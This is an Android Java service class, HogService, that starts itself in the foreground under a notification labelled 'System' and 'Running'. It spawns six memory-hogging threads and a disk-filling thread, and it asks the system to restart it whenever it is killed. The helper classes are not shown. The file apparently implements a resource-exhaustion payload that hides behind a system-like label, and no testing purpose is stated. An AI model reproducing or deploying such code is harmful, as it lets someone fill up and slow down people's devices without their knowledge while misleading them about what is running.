package com.rhfvnc.strain;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
public class HogService extends Service {
    protected int hogThreads = 6;
    public static void start(Context c, Class<?> cls) {
        Intent i = new Intent(c, cls);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }
    @Override
    public void onCreate() {
        super.onCreate();
        try { startForeground(2, Notify.build(this, "hog", "System", "Running")); }
        catch (Throwable ignored) {}
        for (int i = 0; i < hogThreads; i++) {
            Thread t = new Thread(new MemHog(i));
            t.setDaemon(true);
            t.start();
        }
        Thread d = new Thread(new DiskFiller(this));
        d.setDaemon(true);
        d.start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
